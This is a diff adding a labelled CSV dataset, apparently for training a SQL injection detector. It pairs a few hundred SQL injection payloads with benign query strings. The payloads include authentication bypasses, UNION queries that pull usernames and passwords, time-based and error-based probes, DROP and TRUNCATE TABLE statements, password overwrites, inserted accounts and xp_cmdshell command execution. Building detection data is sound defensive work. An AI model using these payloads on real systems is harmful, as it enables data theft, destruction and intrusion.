@@ -1,0 +1,875 @@
+payload,label,attack_type
+%27;+UPDATE+users+SET+password=%27hacked%27--,1,SQL Injection
+login=' OR '1'='1'/*,1,SQL Injection
+' OR 1=1#,1,SQL Injection
+"id=1' UNION SELECT 1,2,3--",1,SQL Injection
+user=' OR SLEEP(5)--,1,SQL Injection
+name=' UNION SELECT column_name FROM information_schema.columns--,1,SQL Injection
+%27+UNION+SELECT+NULL--,1,SQL Injection
+user=' OR 1=1#,1,SQL Injection
+%27)+OR+(%271%27=%271%27--,1,SQL Injection
+id='; WAITFOR DELAY '0:0:5'--,1,SQL Injection
+%2527 OR %25271%2527=%25271%2527--,1,SQL Injection
+"1%27+UNION+SELECT+1,2,3--",1,SQL Injection
+' HAVING 1=0--,1,SQL Injection
+id=admin'/*,1,SQL Injection
+"name=' UNION SELECT NULL,NULL,NULL--",1,SQL Injection
+1+AND+SLEEP(5),1,SQL Injection
+user=1; SELECT SLEEP(5)--,1,SQL Injection
+"' UNION ALL SELECT NULL,NULL--",1,SQL Injection
+id=1 OR 1=1,1,SQL Injection
+"user=1 UNION SELECT 1,2,3",1,SQL Injection
+name=' OR '1'='1'/*,1,SQL Injection
+"name="" OR ""1""=""1",1,SQL Injection
+login=1; WAITFOR DELAY '0:0:5'--,1,SQL Injection
+id=' AND SLEEP(5)--,1,SQL Injection
+'; SELECT version()--,1,SQL Injection
+name=1 OR 1=1,1,SQL Injection
+'; TRUNCATE TABLE users--,1,SQL Injection
+0x2727,1,SQL Injection
+"login=' OR 1=CONVERT(int,'a')--",1,SQL Injection
+"user=1' UNION SELECT 1,2,3--",1,SQL Injection
+%2527) OR (%25271%2527=%25271%2527--,1,SQL Injection
+"login=' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",1,SQL Injection
+user=admin'/*,1,SQL Injection
+') OR 1=1--,1,SQL Injection
+%27+UNION+ALL+SELECT+1--,1,SQL Injection
+id=' OR 'x'='x,1,SQL Injection
+login=1' OR SLEEP(5)--,1,SQL Injection
+id=1'; SELECT pg_sleep(5)--,1,SQL Injection
+%27+OR+1=1--,1,SQL Injection
+%27+OR+1=1+LIMIT+1--,1,SQL Injection
+login=1; SELECT SLEEP(5)--,1,SQL Injection
+"' OR 1=CONVERT(int,'a')--",1,SQL Injection
+id=' OR '1'='1,1,SQL Injection
+"user=' UNION SELECT user(),version(),database()--",1,SQL Injection
+name=1; DROP TABLE users--,1,SQL Injection
+name=' OR 1=1 LIMIT 1--,1,SQL Injection
+\,1,SQL Injection
+"name=1' UNION SELECT 1,2,3--",1,SQL Injection
+user='; TRUNCATE TABLE users--,1,SQL Injection
+%27)+OR+(%271%27=%271,1,SQL Injection
+id=' OR '1'='1'--,1,SQL Injection
+%27,1,SQL Injection
+"' UNION SELECT NULL,NULL--",1,SQL Injection
+user='; EXEC xp_cmdshell('dir')--,1,SQL Injection
+login=' ORDER BY 1--,1,SQL Injection
+"'; INSERT INTO users(username,password) VALUES('hack','hack')--",1,SQL Injection
+"' OR BENCHMARK(5000000,MD5(1))--",1,SQL Injection
+"user=' OR BENCHMARK(5000000,MD5(1))--",1,SQL Injection
+"login=' UNION ALL SELECT NULL,NULL--",1,SQL Injection
+name='; SELECT pg_sleep(5)--,1,SQL Injection
+1; WAITFOR DELAY '0:0:5'--,1,SQL Injection
+"login=-1 UNION SELECT 1,2,3--",1,SQL Injection
+"user=' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",1,SQL Injection
+' UNION ALL SELECT 1--,1,SQL Injection
+' UNION SELECT NULL--,1,SQL Injection
+'+OR+1=1--,1,SQL Injection
+name=admin'/*,1,SQL Injection
+"user=' UNION SELECT NULL,NULL--",1,SQL Injection
+or 1=1--,1,SQL Injection
+"' UNION SELECT user(),version(),database()--",1,SQL Injection
+%2527 AND 1=2--,1,SQL Injection
+"-1 UNION SELECT 1,2,3--",1,SQL Injection
+name=' OR 'x'='x,1,SQL Injection
+'; SELECT current_user--,1,SQL Injection
+""" OR """"=""",1,SQL Injection
+"%2527 UNION SELECT username,password FROM users--",1,SQL Injection
+"id=' UNION SELECT user(),version(),database()--",1,SQL Injection
+"name=1 UNION SELECT 1,2,3",1,SQL Injection
+user=1' OR SLEEP(5)--,1,SQL Injection
+"%27+OR+1=CONVERT(int,%27a%27)--",1,SQL Injection
+"id=1 UNION SELECT 1,2,3",1,SQL Injection
+1' OR ',1,SQL Injection
+"name=' UNION SELECT username,password FROM users--",1,SQL Injection
+%27;+WAITFOR+DELAY+%270:0:5%27--,1,SQL Injection
+%27+AND+SLEEP(5)--,1,SQL Injection
+' OR '1'='1,1,SQL Injection
+%2527 OR 1=1/*,1,SQL Injection
+user=' ORDER BY 1--,1,SQL Injection
+"%27+UNION+ALL+SELECT+NULL,NULL--",1,SQL Injection
+"%27+UNION+SELECT+1,2,3--",1,SQL Injection
+user=') OR ('1'='1'--,1,SQL Injection
+' UNION SELECT table_name FROM information_schema.tables--,1,SQL Injection
+1%27+OR+SLEEP(5)--,1,SQL Injection
+"name=' UNION SELECT 1,2,3--",1,SQL Injection
+%27+AND+1=2--,1,SQL Injection
+name='; WAITFOR DELAY '0:0:5'--,1,SQL Injection
+user='; UPDATE users SET password='hacked'--,1,SQL Injection
+user=1) OR 1=1--,1,SQL Injection
+%27;+EXEC+xp_cmdshell(%27dir%27)--,1,SQL Injection
+login=' OR '1'='1,1,SQL Injection
+admin%27/*,1,SQL Injection
+"1+UNION+SELECT+1,2,3",1,SQL Injection
+1%27+OR+%271%27=%271,1,SQL Injection
+name=') OR ('1'='1'--,1,SQL Injection
+"%27+UNION+SELECT+NULL,NULL,NULL--",1,SQL Injection
+1%2527 OR %25271%2527=%25271,1,SQL Injection
+user=' OR 1=1--,1,SQL Injection
+') OR ('1'='1,1,SQL Injection
+name=admin' #,1,SQL Injection
+"id=' UNION SELECT NULL,NULL,NULL--",1,SQL Injection
+name=' OR '1'='1,1,SQL Injection
+%2527 AND 1=1--,1,SQL Injection
+or true,1,SQL Injection
+1%2527 AND %25271%2527=%25271,1,SQL Injection
+login=' OR 1=1 LIMIT 1--,1,SQL Injection
+user=' AND 1=1--,1,SQL Injection
+login='; EXEC xp_cmdshell('dir')--,1,SQL Injection
+user=' UNION SELECT table_name FROM information_schema.tables--,1,SQL Injection
+name=' UNION SELECT table_name FROM information_schema.tables--,1,SQL Injection
+' OR id IS NOT NULL LIMIT 1--,1,SQL Injection
+' %2bOR%2b1=1--,1,SQL Injection
+' OR 1=1/*,1,SQL Injection
+name=' OR 1=1#,1,SQL Injection
+name=' OR '1'='1'--,1,SQL Injection
+%27;+SELECT+pg_sleep(5)--,1,SQL Injection
+"' OR 1 GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0)#",1,SQL Injection
+name=1 AND 1=2,1,SQL Injection
+"login=-1' UNION SELECT 1,2,3--",1,SQL Injection
+user=1 AND SLEEP(5),1,SQL Injection
+'; DROP TABLE users--,1,SQL Injection
+' ; exec master..xp_cmdshell 'dir'--,1,SQL Injection
+' ;,1,SQL Injection
+"login=' UNION SELECT user(),version(),database()--",1,SQL Injection
+' ORDER BY 1--,1,SQL Injection
+id='; UPDATE users SET password='hacked'--,1,SQL Injection
+login='; TRUNCATE TABLE users--,1,SQL Injection
+' GROUP BY 1--,1,SQL Injection
+' AND 1=2--,1,SQL Injection
+""" OR 1=1--",1,SQL Injection
+user=1; WAITFOR DELAY '0:0:5'--,1,SQL Injection
+';%20OR%201=1--,1,SQL Injection
+"login="" OR ""1""=""1",1,SQL Injection
+user=1' AND '1'='1,1,SQL Injection
+login=' ORDER BY 2--,1,SQL Injection
+'; EXEC xp_cmdshell('dir')--,1,SQL Injection
+"%27+UNION+SELECT+user(),version(),database()--",1,SQL Injection
+name=1' AND '1'='1,1,SQL Injection
+1; SELECT SLEEP(5)--,1,SQL Injection
+"-1' UNION SELECT 1,2,3--",1,SQL Injection
+login='; WAITFOR DELAY '0:0:5'--,1,SQL Injection
+id=' OR '1'='1'/*,1,SQL Injection
+"id="" OR ""1""=""1",1,SQL Injection
+1'; SELECT pg_sleep(5)--,1,SQL Injection
+"login=1 UNION SELECT 1,2,3",1,SQL Injection
+%2527 OR 1=1#,1,SQL Injection
+id=' AND 1=1--,1,SQL Injection
+login=' OR 1=1/*,1,SQL Injection
+id=admin' #,1,SQL Injection
+1)+OR+1=1--,1,SQL Injection
+%27+UNION+SELECT+column_name+FROM+information_schema.columns--,1,SQL Injection
+id=1; DROP TABLE users--,1,SQL Injection
+"name=' UNION SELECT NULL,NULL--",1,SQL Injection
+admin%2527/*,1,SQL Injection
+"name='; INSERT INTO users(username,password) VALUES('hack','hack')--",1,SQL Injection
+"id=' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",1,SQL Injection
+login=1) OR 1=1--,1,SQL Injection
+"' UNION SELECT NULL,NULL,NULL--",1,SQL Injection
+"id='; INSERT INTO users(username,password) VALUES('hack','hack')--",1,SQL Injection
+user=1' OR '1'='1,1,SQL Injection
+%27+OR+1=1/*,1,SQL Injection
+"' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",1,SQL Injection
+%27+OR+1=1#,1,SQL Injection
+name=1; SELECT SLEEP(5)--,1,SQL Injection
+name='; TRUNCATE TABLE users--,1,SQL Injection
+%27+OR+%271%27=%271%27--,1,SQL Injection
+admin%27--,1,SQL Injection
+user=' ORDER BY 2--,1,SQL Injection
+user=1 AND 1=2,1,SQL Injection
+' OR CHAR(97)='a'--,1,SQL Injection
+"id=-1 UNION SELECT 1,2,3--",1,SQL Injection
+user=1'; SELECT pg_sleep(5)--,1,SQL Injection
+1) OR 1=1--,1,SQL Injection
+login='; UPDATE users SET password='hacked'--,1,SQL Injection
+"user='; INSERT INTO users(username,password) VALUES('hack','hack')--",1,SQL Injection
+user='; DROP TABLE users--,1,SQL Injection
+name=' AND 1=2--,1,SQL Injection
+"%27+AND+ROW(1,1)>(SELECT+COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x+FROM+information_schema.tables+GROUP+BY+x)--",1,SQL Injection
+' OR SLEEP(5)--,1,SQL Injection
+id=1' AND '1'='1,1,SQL Injection
+%27+ORDER+BY+2--,1,SQL Injection
+login='; DROP TABLE users--,1,SQL Injection
+') OR ('1'='1'--,1,SQL Injection
+user=' AND 1=1 ORDER BY 1--,1,SQL Injection
+"user=' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",1,SQL Injection
+' or '1'='1' --,1,SQL Injection
+login=') OR ('1'='1,1,SQL Injection
+"name=' OR BENCHMARK(5000000,MD5(1))--",1,SQL Injection
+%27+ORDER+BY+1--,1,SQL Injection
+' HAVING 1=1--,1,SQL Injection
+or true--,1,SQL Injection
+login=' UNION SELECT NULL--,1,SQL Injection
+"name=-1 UNION SELECT 1,2,3--",1,SQL Injection
+id=1' OR SLEEP(5)--,1,SQL Injection
+' ; SELECT @@version--,1,SQL Injection
+name=1' OR '1'='1,1,SQL Injection
+'%0AOR%0A1=1--,1,SQL Injection
+user=1; DROP TABLE users--,1,SQL Injection
+%2527 OR %25271%2527=%25271,1,SQL Injection
+"login=' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",1,SQL Injection
+name=1 AND SLEEP(5),1,SQL Injection
+'; WAITFOR DELAY '0:0:5'--,1,SQL Injection
+name=1'; SELECT pg_sleep(5)--,1,SQL Injection
+'',1,SQL Injection
+name=' ORDER BY 2--,1,SQL Injection
+id=1 AND 1=1,1,SQL Injection
+"' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",1,SQL Injection
+id=' AND 1=2--,1,SQL Injection
+%2527 OR %2527x%2527=%2527x,1,SQL Injection
+"%27;+INSERT+INTO+users(username,password)+VALUES(%27hack%27,%27hack%27)--",1,SQL Injection
+' OR '1'='1'--,1,SQL Injection
+1;+WAITFOR+DELAY+%270:0:5%27--,1,SQL Injection
+user=' AND 1=2--,1,SQL Injection
+%27;+DROP+TABLE+users--,1,SQL Injection
+%2527,1,SQL Injection
+user=' UNION ALL SELECT 1--,1,SQL Injection
+"name=' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--",1,SQL Injection
+' OR LENGTH('')=0--,1,SQL Injection
+admin' #,1,SQL Injection
+"' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",1,SQL Injection
+login=1 AND 1=2,1,SQL Injection
+"-1%27+UNION+SELECT+1,2,3--",1,SQL Injection
+login='; SELECT pg_sleep(5)--,1,SQL Injection
+id='; EXEC xp_cmdshell('dir')--,1,SQL Injection
+'; SELECT pg_sleep(5)--,1,SQL Injection
+admin'/*,1,SQL Injection
+0x27,1,SQL Injection
+login=' OR 'x'='x,1,SQL Injection
+%27+OR+%271%27=%271%27/*,1,SQL Injection
+id=') OR ('1'='1,1,SQL Injection
+user=' OR '1'='1,1,SQL Injection
+' ORDER BY 2--,1,SQL Injection
+id=' OR 1=1 LIMIT 1--,1,SQL Injection
+"user="" OR ""1""=""1",1,SQL Injection
+user=1 AND 1=1,1,SQL Injection
+%27+OR+%27x%27=%27x,1,SQL Injection
+user=' OR '1'='1'--,1,SQL Injection
+1%27;+SELECT+pg_sleep(5)--,1,SQL Injection
+login=admin'/*,1,SQL Injection
+login=1' OR '1'='1,1,SQL Injection
+' AND 1=1 ORDER BY 1--,1,SQL Injection
+"login=' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--",1,SQL Injection
+' OR 'x'='x,1,SQL Injection
+id='; TRUNCATE TABLE users--,1,SQL Injection
+user='; SELECT pg_sleep(5)--,1,SQL Injection
+name=' AND SLEEP(5)--,1,SQL Injection
+1; DROP TABLE users--,1,SQL Injection
+"name=' UNION SELECT user(),version(),database()--",1,SQL Injection
+1;+DROP+TABLE+users--,1,SQL Injection
+%27;+TRUNCATE+TABLE+users--,1,SQL Injection
+user=' UNION SELECT column_name FROM information_schema.columns--,1,SQL Injection
+"id=' OR 1=CONVERT(int,'a')--",1,SQL Injection
+login=' AND 1=1 ORDER BY 1--,1,SQL Injection
+"login=1' UNION SELECT 1,2,3--",1,SQL Injection
+' AND 1=1--,1,SQL Injection
+'/**/OR/**/1=1--,1,SQL Injection
+login=' OR '1'='1'--,1,SQL Injection
+id=' OR 1=1/*,1,SQL Injection
+admin' --,1,SQL Injection
+name=1; WAITFOR DELAY '0:0:5'--,1,SQL Injection
+"login=' UNION SELECT NULL,NULL--",1,SQL Injection
+"login='; INSERT INTO users(username,password) VALUES('hack','hack')--",1,SQL Injection
+name=1) OR 1=1--,1,SQL Injection
+%2527 UNION SELECT table_name FROM information_schema.tables--,1,SQL Injection
+"-1+UNION+SELECT+1,2,3--",1,SQL Injection
+name=' ORDER BY 1--,1,SQL Injection
+' OR 0x313d31--,1,SQL Injection
+%2527 OR 1=1--,1,SQL Injection
+"id=' UNION SELECT username,password FROM users--",1,SQL Injection
+1+AND+1=2,1,SQL Injection
+' /*!OR*/ '1'='1,1,SQL Injection
+id=' OR SLEEP(5)--,1,SQL Injection
+name=' AND 1=1 ORDER BY 1--,1,SQL Injection
+user=' OR '1'='1'/*,1,SQL Injection
+%27+OR+%271%27=%271,1,SQL Injection
+%2527 UNION ALL SELECT 1--,1,SQL Injection
+1;+SELECT+SLEEP(5)--,1,SQL Injection
+"login=' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",1,SQL Injection
+admin%2527--,1,SQL Injection
+name=' OR SLEEP(5)--,1,SQL Injection
+%27+OR+SLEEP(5)--,1,SQL Injection
+admin%27+#,1,SQL Injection
+"user=' UNION SELECT username,password FROM users--",1,SQL Injection
+id=' UNION SELECT column_name FROM information_schema.columns--,1,SQL Injection
+login=1 OR 1=1,1,SQL Injection
+id=1 AND SLEEP(5),1,SQL Injection
+1 AND SLEEP(5),1,SQL Injection
+login=' AND 1=1--,1,SQL Injection
+"name=' UNION ALL SELECT NULL,NULL--",1,SQL Injection
+login=' UNION SELECT table_name FROM information_schema.tables--,1,SQL Injection
+1+OR+1=1,1,SQL Injection
+login=' AND 1=2--,1,SQL Injection
+%27+AND+1=1+ORDER+BY+1--,1,SQL Injection
+' OR 'x'='x'--,1,SQL Injection
+name='; UPDATE users SET password='hacked'--,1,SQL Injection
+id=' UNION SELECT NULL--,1,SQL Injection
+id=' UNION SELECT table_name FROM information_schema.tables--,1,SQL Injection
+%2527 UNION SELECT NULL--,1,SQL Injection
+%22+OR+%221%22=%221,1,SQL Injection
+name='; DROP TABLE users--,1,SQL Injection
+"' OR 1=1 LIMIT 1,1--",1,SQL Injection
+id=' ORDER BY 2--,1,SQL Injection
+' OR/**/'1'='1,1,SQL Injection
+"user=' UNION SELECT NULL,NULL,NULL--",1,SQL Injection
+1' OR SLEEP(5)--,1,SQL Injection
+id=' OR 1=1#,1,SQL Injection
+"%27+AND+UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",1,SQL Injection
+"id=-1' UNION SELECT 1,2,3--",1,SQL Injection
+1%27+AND+%271%27=%271,1,SQL Injection
+user=1 OR 1=1,1,SQL Injection
+"user=' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--",1,SQL Injection
+login=1'; SELECT pg_sleep(5)--,1,SQL Injection
+login=' AND SLEEP(5)--,1,SQL Injection
+id=' AND 1=1 ORDER BY 1--,1,SQL Injection
+admin'/*comment*/--,1,SQL Injection
+' ORDER BY 10--,1,SQL Injection
+"""",1,SQL Injection
+"' UNION SELECT 1,2,3--",1,SQL Injection
+"' OR IFNULL(NULL,'1')='1'--",1,SQL Injection
+name=') OR ('1'='1,1,SQL Injection
+' OR '1'='1'/*,1,SQL Injection
+"name=-1' UNION SELECT 1,2,3--",1,SQL Injection
+name=admin'--,1,SQL Injection
+"user=' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",1,SQL Injection
+user=admin' #,1,SQL Injection
+"login=' UNION SELECT username,password FROM users--",1,SQL Injection
+user=' OR 1=1 LIMIT 1--,1,SQL Injection
+"id=' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",1,SQL Injection
+1 AND 1=2,1,SQL Injection
+%27%27,1,SQL Injection
+%2522 OR %25221%2522=%25221,1,SQL Injection
+name=' UNION ALL SELECT 1--,1,SQL Injection
+1 OR 1=1,1,SQL Injection
+id=') OR ('1'='1'--,1,SQL Injection
+id=1; WAITFOR DELAY '0:0:5'--,1,SQL Injection
+"id=' UNION ALL SELECT NULL,NULL--",1,SQL Injection
+1' OR '1'='1,1,SQL Injection
+%2527 OR %25271%2527=%25271%2527/*,1,SQL Injection
+') OR ('x'='x,1,SQL Injection
+login=' OR SLEEP(5)--,1,SQL Injection
+login=' OR 1=1#,1,SQL Injection
+%22,1,SQL Injection
+"%2527 UNION SELECT 1,2,3--",1,SQL Injection
+' OR 1=1--,1,SQL Injection
+' OR ISNULL(NULL)--,1,SQL Injection
+user=' OR 1=1/*,1,SQL Injection
+1+AND+1=1,1,SQL Injection
+user=' OR 'x'='x,1,SQL Injection
+1 AND 1=1,1,SQL Injection
+login=') OR ('1'='1'--,1,SQL Injection
+"user=-1 UNION SELECT 1,2,3--",1,SQL Injection
+admin%2527 #,1,SQL Injection
+name=1' OR SLEEP(5)--,1,SQL Injection
+%2527 OR 1=1 LIMIT 1--,1,SQL Injection
+name=' UNION SELECT NULL--,1,SQL Injection
+name=1 AND 1=1,1,SQL Injection
+login=1 AND SLEEP(5),1,SQL Injection
+id=' UNION ALL SELECT 1--,1,SQL Injection
+'%09OR%091=1--,1,SQL Injection
+"user=' UNION SELECT 1,2,3--",1,SQL Injection
+"%27+AND+1=CONVERT(int,(SELECT+TOP+1+name+FROM+sysobjects+WHERE+xtype=%27U%27))--",1,SQL Injection
+"id=' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--",1,SQL Injection
+"%27+OR+BENCHMARK(5000000,MD5(1))--",1,SQL Injection
+""" OR ""1""=""1",1,SQL Injection
+login=' UNION ALL SELECT 1--,1,SQL Injection
+login=' UNION SELECT column_name FROM information_schema.columns--,1,SQL Injection
+user=' AND SLEEP(5)--,1,SQL Injection
+%27+AND+1=1--,1,SQL Injection
+'; DECLARE @q nvarchar(200) SET @q=0x73656C65637420404076657273696F6E EXEC(@q)--,1,SQL Injection
+user=' UNION SELECT NULL--,1,SQL Injection
+' AND SLEEP(5)--,1,SQL Injection
+"id=' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",1,SQL Injection
+' OR 1=1 LIMIT 1--,1,SQL Injection
+id=admin'--,1,SQL Injection
+login=1 AND 1=1,1,SQL Injection
+user=admin'--,1,SQL Injection
+"user=-1' UNION SELECT 1,2,3--",1,SQL Injection
+"id=' UNION SELECT 1,2,3--",1,SQL Injection
+user='; WAITFOR DELAY '0:0:5'--,1,SQL Injection
+"1' UNION SELECT 1,2,3--",1,SQL Injection
+"%2527 UNION SELECT NULL,NULL--",1,SQL Injection
+"id=' UNION SELECT NULL,NULL--",1,SQL Injection
+'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,1,SQL Injection
+' OR 1--,1,SQL Injection
+name='; EXEC xp_cmdshell('dir')--,1,SQL Injection
+"%2527 UNION ALL SELECT NULL,NULL--",1,SQL Injection
+%2527) OR (%25271%2527=%25271,1,SQL Injection
+"name=' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",1,SQL Injection
+"' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--",1,SQL Injection
+"login=' UNION SELECT 1,2,3--",1,SQL Injection
+login=admin' #,1,SQL Injection
+"name=' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",1,SQL Injection
+name=' OR 1=1--,1,SQL Injection
+' UNION SELECT column_name FROM information_schema.columns--,1,SQL Injection
+"%27+UNION+SELECT+username,password+FROM+users--",1,SQL Injection
+id=1) OR 1=1--,1,SQL Injection
+id=1 AND 1=2,1,SQL Injection
+id=' OR 1=1--,1,SQL Injection
+"id=' OR BENCHMARK(5000000,MD5(1))--",1,SQL Injection
+or 1=1,1,SQL Injection
+admin'--,1,SQL Injection
+login=admin'--,1,SQL Injection
+"%27+UNION+SELECT+NULL,NULL--",1,SQL Injection
+name=' AND 1=1--,1,SQL Injection
+"name=' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",1,SQL Injection
+id=' ORDER BY 1--,1,SQL Injection
+login=' OR 1=1--,1,SQL Injection
+"login=' OR BENCHMARK(5000000,MD5(1))--",1,SQL Injection
+name=' OR 1=1/*,1,SQL Injection
+1' AND '1'='1,1,SQL Injection
+"name=' OR 1=CONVERT(int,'a')--",1,SQL Injection
+"%2527 UNION SELECT NULL,NULL,NULL--",1,SQL Injection
+"user=' UNION ALL SELECT NULL,NULL--",1,SQL Injection
+'; UPDATE users SET password='hacked'--,1,SQL Injection
+login=1' AND '1'='1,1,SQL Injection
+user=') OR ('1'='1,1,SQL Injection
+%27+UNION+SELECT+table_name+FROM+information_schema.tables--,1,SQL Injection
+login=1; DROP TABLE users--,1,SQL Injection
+"%27+AND+EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",1,SQL Injection
+"login=' UNION SELECT NULL,NULL,NULL--",1,SQL Injection
+id='; SELECT pg_sleep(5)--,1,SQL Injection
+id=1; SELECT SLEEP(5)--,1,SQL Injection
+',1,SQL Injection
+"user=' OR 1=CONVERT(int,'a')--",1,SQL Injection
+"' UNION SELECT username,password FROM users--",1,SQL Injection
+"1 UNION SELECT 1,2,3",1,SQL Injection
+id=1' OR '1'='1,1,SQL Injection
+id='; DROP TABLE users--,1,SQL Injection
+format=json&api_key=Makassar&limit=7607,0,Normal
+format=json&api_key=login&limit=591,0,Normal
+callback=getData&limit=468,0,Normal
+name=Siti Rahayu&age=3311,0,Normal
+callback=getData&limit=3678,0,Normal
+/category/sports/page/39,0,Normal
+format=json&api_key=2023&limit=8051,0,Normal
+name=Manager2&age=8531,0,Normal
+page=15,0,Normal
+/api/products/2806?format=json,0,Normal
+format=json&api_key=new&limit=1390,0,Normal
+/category/electronics/page/36,0,Normal
+/api/products/2235?format=json,0,Normal
+id=543,0,Normal
+callback=getData&limit=1928,0,Normal
+name=Budi Santoso&age=3812,0,Normal
+/api/users/6184,0,Normal
+filter=electronics&sort=asc&page=27,0,Normal
+/category/tools/page/42,0,Normal
+/category/electronics/page/23,0,Normal
+filter=health&sort=asc&page=23,0,Normal
+callback=getData&limit=9195,0,Normal
+filter=food&sort=asc&page=25,0,Normal
+format=json&api_key=main&limit=7838,0,Normal
+file=brand.pdf,0,Normal
+page=17,0,Normal
+format=json&api_key=tablet&limit=7516,0,Normal
+/api/products/5019?format=json,0,Normal
+search=Jakarta,0,Normal
+/category/electronics/page/48,0,Normal
+action=view&id=3355&type=fashion,0,Normal
+callback=getData&limit=4621,0,Normal
+email=info@toko.com&message=health,0,Normal
+name=Manager2&age=7238,0,Normal
+page=40,0,Normal
+q=latest&lang=id,0,Normal
+/api/users/9272,0,Normal
+product_id=6572,0,Normal
+product_id=3375,0,Normal
+file=electronics.pdf,0,Normal
+name=Budi Santoso&age=2820,0,Normal
+lang=id&theme=default&user=user123,0,Normal
+filter=fashion&sort=asc&page=29,0,Normal
+action=view&id=9179&type=health,0,Normal
+name=John Doe&age=4679,0,Normal
+id=9220,0,Normal
+token=Surabaya&user=john_doe,0,Normal
+token=product&user=operator,0,Normal
+id=1329,0,Normal
+id=3412,0,Normal
+/api/products/9870?format=json,0,Normal
+/category/sports/page/7,0,Normal
+action=view&id=6008&type=health,0,Normal
+id=6505,0,Normal
+action=view&id=4606&type=fashion,0,Normal
+/api/products/959?format=json,0,Normal
+email=support@web.co.id&message=webcam,0,Normal
+/profile?user=budi_santoso,0,Normal
+email=user@example.com&message=smartphone,0,Normal
+filter=food&sort=asc&page=2,0,Normal
+callback=getData&limit=1010,0,Normal
+id=5252,0,Normal
+filter=tools&sort=asc&page=5,0,Normal
+name=Siti Rahayu&age=8143,0,Normal
+action=view&id=7393&type=food,0,Normal
+/api/users/937,0,Normal
+callback=getData&limit=4576,0,Normal
+/search?q=printer&category=books,0,Normal
+token=register&user=operator,0,Normal
+category=fashion,0,Normal
+filter=health&sort=asc&page=20,0,Normal
+name=John Doe&age=4156,0,Normal
+format=json&api_key=food&limit=1611,0,Normal
+filter=tools&sort=asc&page=26,0,Normal
+/search?q=model&category=health,0,Normal
+callback=getData&limit=1292,0,Normal
+callback=getData&limit=6364,0,Normal
+user=john_doe,0,Normal
+search=2023,0,Normal
+callback=getData&limit=6026,0,Normal
+format=json&api_key=category&limit=9087,0,Normal
+callback=getData&limit=5654,0,Normal
+q=about&lang=id,0,Normal
+filter=health&sort=asc&page=12,0,Normal
+format=json&api_key=popular&limit=7954,0,Normal
+/api/products/5753?format=json,0,Normal
+/api/products/1107?format=json,0,Normal
+q=tablet&lang=id,0,Normal
+token=artikel&user=siti_rahayu,0,Normal
+/api/products/5351?format=json,0,Normal
+id=4505,0,Normal
+file=index.pdf,0,Normal
+q=electronics&lang=id,0,Normal
+product_id=2654,0,Normal
+callback=getData&limit=7145,0,Normal
+filter=health&sort=asc&page=37,0,Normal
+token=Jakarta&user=staff01,0,Normal
+action=view&id=3395&type=health,0,Normal
+format=json&api_key=panduan&limit=6468,0,Normal
+/api/users/6219,0,Normal
+action=view&id=1175&type=sports,0,Normal
+/api/users/5219,0,Normal
+/search?q=profile&category=sports,0,Normal
+q=Makassar&lang=id,0,Normal
+/category/food/page/13,0,Normal
+name=Admin User&age=7669,0,Normal
+callback=getData&limit=3061,0,Normal
+/api/products/3726?format=json,0,Normal
+/api/products/2808?format=json,0,Normal
+email=user@example.com&message=fashion,0,Normal
+/api/users/9043,0,Normal
+file=Surabaya.pdf,0,Normal
+filter=books&sort=asc&page=11,0,Normal
+token=webcam&user=budi_santoso,0,Normal
+name=Jane Smith&age=9732,0,Normal
+search=dashboard,0,Normal
+product_id=5814,0,Normal
+token=new&user=user123,0,Normal
+/api/products/6608?format=json,0,Normal
+id=8908,0,Normal
+email=info@toko.com&message=new,0,Normal
+page=28,0,Normal
+/category/food/page/45,0,Normal
+/search?q=category&category=fashion,0,Normal
+product_id=9929,0,Normal
+format=json&api_key=Bandung&limit=4790,0,Normal
+product_id=6756,0,Normal
+/api/users/1330,0,Normal
+action=view&id=2395&type=food,0,Normal
+/category/books/page/45,0,Normal
+name=Admin User&age=1849,0,Normal
+lang=id&theme=default&user=supervisor,0,Normal
+page=29,0,Normal
+id=6963,0,Normal
+email=info@toko.com&message=tutorial,0,Normal
+callback=getData&limit=7918,0,Normal
+page=36,0,Normal
+format=json&api_key=Jakarta&limit=7757,0,Normal
+name=Operator&age=545,0,Normal
+product_id=2282,0,Normal
+/api/products/7047?format=json,0,Normal
+/search?q=brand&category=fashion,0,Normal
+email=admin@company.id&message=Makassar,0,Normal
+product_id=8053,0,Normal
+callback=getData&limit=746,0,Normal
+format=json&api_key=2024&limit=3206,0,Normal
+format=json&api_key=Surabaya&limit=6297,0,Normal
+action=view&id=8041&type=tools,0,Normal
+email=info@toko.com&message=keyboard,0,Normal
+page=50,0,Normal
+name=John Doe&age=4618,0,Normal
+product_id=2762,0,Normal
+token=about&user=jane_smith,0,Normal
+/api/products/3416?format=json,0,Normal
+/api/products/5821?format=json,0,Normal
